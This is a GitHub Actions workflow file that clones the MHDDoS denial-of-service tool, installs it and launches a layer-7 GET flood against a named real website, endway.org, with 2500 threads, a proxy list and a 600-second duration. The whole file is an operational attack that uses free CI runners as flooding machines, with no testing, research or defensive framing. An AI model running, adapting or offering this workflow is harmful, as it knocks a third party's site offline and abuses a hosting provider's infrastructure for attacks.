name: mhddos
on: workflow_dispatch
jobs:
  mhddos:
    runs-on: ubuntu-24.04-arm
    steps:
      - run: |
          git clone https://github.com/MatrixTM/MHDDoS.git
          cd MHDDoS
          pip install -r requirements.txt
          python start.py GET https://endway.org/ 0 2500 all.txt 2500 600 true
